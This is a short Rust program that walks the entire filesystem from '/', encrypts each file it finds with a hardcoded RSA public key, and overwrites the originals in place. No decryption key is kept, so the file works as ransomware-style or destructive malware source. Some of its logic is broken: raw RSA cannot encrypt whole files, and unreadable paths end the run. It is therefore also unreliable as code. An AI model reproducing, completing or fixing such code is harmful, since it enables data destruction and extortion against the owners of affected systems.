use std::error::Error;
use openssl::rsa::{Rsa, Padding};
use std::fs::File;
use std::io::{Read, Write};
use std::fs;
fn list_files(dir: &str) -> String {  
    let mut files_str = String::new();
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.filter_map(Result::ok) {
            let path = entry.path();
            if path.is_file() {
                files_str.push_str(&format!("{}\n", path.display()));
            } else {
                let sub_dir_files = list_files(path.to_str().unwrap());
                files_str.push_str(&sub_dir_files);
            }
        }
    }
    files_str
}
fn main() -> Result<(), Box<dyn Error>> {
    let root_dir = "/";
    let files = list_files(root_dir);
    let file_to_encrypt_path = files;
    println!("{:?}", file_to_encrypt_path);
    let public_key_pem = "-----BEGIN PUBLIC KEY-----\n\
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoGJqwb/Hkf3XIIpompwv\n\
    /TSfiVjhlOLABza48Tebe4x5u2npS0B3E/vCg9rOWVbNVwtj5EJ83umVILAzAFzS\n\
    4Px3nkWKj3IV15kYQWVWXjjjxa+8rf08369uJgeJkQBOyounOD0m3jW0kuZgrKtw\n\
    Ft6feAwzPkr5n/exCQvixJcEl8gO/L3nvWbOs/pw8A0zuQ5LA8P4biUKrwp/g4kn\n\
    a7LYGe6SkMSEhDojpQbhmYqY6VfxG/9pvEuCGFP/+CxHqAyx/PiEpMHAsvThuUme\n\
    FWw0cgxSnx+3TZ1wxV/XnDPR2+OaPycnBlshZHRuK6ni1PknZcFWoDwQMwYDc6Os\n\
    fQIDAQAB\n\
    -----END PUBLIC KEY-----";
    let public_key = Rsa::public_key_from_pem(public_key_pem.as_bytes())?;
    for file in file_to_encrypt_path.split('\n') {
       let mut file_to_encrypt = File::open(file)?;
       let mut data = Vec::new();
       file_to_encrypt.read_to_end(&mut data)?;
       println!("{:?}", data);
    // 
       let mut encrypted_data = vec![0; public_key.size() as usize];
       let encrypted_length = public_key.public_encrypt(&data, &mut encrypted_data, Padding::PKCS1)?;
    // 
       let mut file_to_encrypt = File::create(file)?;
       file_to_encrypt.write_all(&encrypted_data[..encrypted_length as usize])?;
    } 
    Ok(())
}
